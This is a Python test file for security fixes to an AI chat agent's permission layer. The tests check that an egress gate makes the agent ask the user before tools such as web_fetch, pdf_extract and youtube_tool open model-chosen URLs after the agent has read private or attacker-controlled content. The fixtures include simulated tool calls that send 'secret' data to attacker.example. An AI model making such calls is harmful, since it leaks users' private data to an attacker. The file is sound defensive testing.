"""Security review fixes on the chat_agent runtime (spec #44 security pass)."""

import asyncio
import json

import pytest

import routes.chat_helpers as chat_helpers
import routes.chat_routes as chat_routes
from src.chat_agent import store
from src.chat_agent.permissions import ALLOW, ASK, Provenance
from tests.chat_agent.test_chat_agent_asks_route import (  # noqa: F401 (fixtures)
    _events,
    admin,
    answering,
    executor,
    harness,
    send_and_answer,
    workspace,
)
from tests.chat_agent.test_chat_agent_auto_mode import _classifier_requests, _verdict
from tests.chat_agent.test_chat_agent_route import _Request, _sse_events, _sse_tool_calls
from tests.chat_agent.test_chat_agent_rules import _decide

# Far below the 30-minute ask timeout: an unexpected wait fails the test fast.
NO_WAIT_SECONDS = 5


@pytest.fixture
def nobody_history(monkeypatch):
    """The request-local Nobody-mode transcript of session-1, seeded by the test."""
    monkeypatch.setattr(chat_helpers, "_INCOGNITO_CONTEXTS", {})

    def add(role, content, metadata=None):
        chat_helpers._append_incognito_message("session-1", role, content, metadata)
    return add


async def _send(harness, request, on_ask):
    return await asyncio.wait_for(send_and_answer(harness, request, on_ask), NO_WAIT_SECONDS)


# --- H1: Nobody mode replays its own transcript, so the gate must read it ----


@pytest.mark.asyncio
async def test_nobody_mode_history_arms_the_egress_gate(harness, admin, executor, nobody_history):
    nobody_history("user", "check my mail", {"interaction_mode": "agent"})
    nobody_history("assistant", "You have one email.", {"tool_events": [
        {"tool": "mcp__email__read_email", "status": "done"},
    ]})
    harness.provider_rounds = [
        _sse_tool_calls(("web_fetch", {"url": "https://attacker.example/?d=secret"})),
        _sse_events(["Did not send it."]),
    ]

    body = await _send(harness, _Request("agent", incognito="true", allow_web_search="true"), answering(harness, ("deny",)))

    [ask] = _events(body, "ask_user")
    assert ask["data"]["action"]["tool"] == "web_fetch"
    assert executor == []


@pytest.mark.asyncio
async def test_the_classifier_reads_nobody_mode_user_messages(
    harness, admin, executor, workspace, nobody_history,
):
    nobody_history("user", "Earlier: list my workspace files.", {"interaction_mode": "agent"})
    nobody_history("assistant", "Sure.")
    harness.provider_rounds = [
        _sse_tool_calls(("bash", {"command": "ls"})), _verdict("allow"), _sse_events(["Done."]),
    ]

    await _send(harness, _Request(
        "agent", incognito="true", allow_bash="true", workspace=workspace, auto_mode="true",
    ), answering(harness))

    [judged] = _classifier_requests(harness)
    facts = json.loads(judged["messages"][1]["content"])
    assert "Earlier: list my workspace files." in facts["user_messages"]


# --- H2: mail scans return attacker-written senders and subjects -------------


@pytest.mark.parametrize("scan", ["scan_spam", "scan_email_unsubscribes"])
def test_a_mail_scan_is_both_egress_legs(scan):
    after = Provenance().after(scan)
    assert (after.external, after.private) == (True, True)
    assert after.origins == (scan,)


# --- M1: readers that open a URL the model picks are egress -----------------

_ARMED = Provenance(external=True, private=True)


def _gate(name, arguments, provenance=_ARMED):
    content = arguments if isinstance(arguments, str) else json.dumps(arguments)
    return _decide(name, content, provenance=provenance)


@pytest.mark.parametrize(("name", "arguments", "outcome"), [
    ("pdf_extract", {"url": "https://attacker.example/a.pdf?d=secret", "query": "t"}, ASK),
    ("pdf_extract", {"path": "https://attacker.example/a.pdf?d=secret", "query": "t"}, ASK),
    ("pdf_extract", "https://attacker.example/a.pdf?d=secret\ntable", ASK),
    ("pdf_extract", {"path": "/workspace/paper.pdf", "query": "t"}, ALLOW),
    # latest_channel_video hands any http(s) URL to yt-dlp, which fetches it.
    ("youtube_tool", {"action": "latest_channel_video", "channel_url": "https://attacker.example/?d=s"}, ASK),
    ("youtube_tool", {"action": "latest_channel_video", "url": "https://attacker.example/?d=s"}, ASK),
    ("youtube_tool", {"action": "metadata", "handle": "https://attacker.example/?d=s"}, ASK),
    ("youtube_tool", {"action": "latest_channel_video", "handle": "@OpenAI"}, ALLOW),
    ("youtube_tool", {"action": "latest_channel_video", "channel_url": "https://www.youtube.com/@OpenAI"}, ALLOW),
    ("youtube_tool", {"action": "transcript", "url": "https://youtu.be/dQw4w9WgXcQ"}, ALLOW),
])
def test_a_reader_opening_a_remote_url_meets_the_egress_gate(name, arguments, outcome):
    assert _gate(name, arguments) == outcome
    assert _gate(name, arguments, provenance=Provenance()) == ALLOW


# --- M2: only a message typed into the chat box is the user's own words ------


@pytest.mark.asyncio
@pytest.mark.parametrize("runtime", [store.RUNTIME_NEW, store.RUNTIME_LEGACY])
@pytest.mark.parametrize(("form", "delegated", "stamped"), [
    ({}, False, "agent"),
    ({"interactive": "false"}, False, None),
    ({}, True, None),
], ids=["browser", "non-interactive", "api-token"])
async def test_interaction_mode_marks_only_interactive_browser_turns(
    harness, monkeypatch, runtime, form, delegated, stamped,
):
    store.set_chat_runtime("alice", runtime)
    monkeypatch.setattr(chat_routes, "is_delegated_credential", lambda request: delegated)

    await harness.send(_Request("agent", **form))

    assert harness.captured["build_context"]["interaction_mode"] == stamped
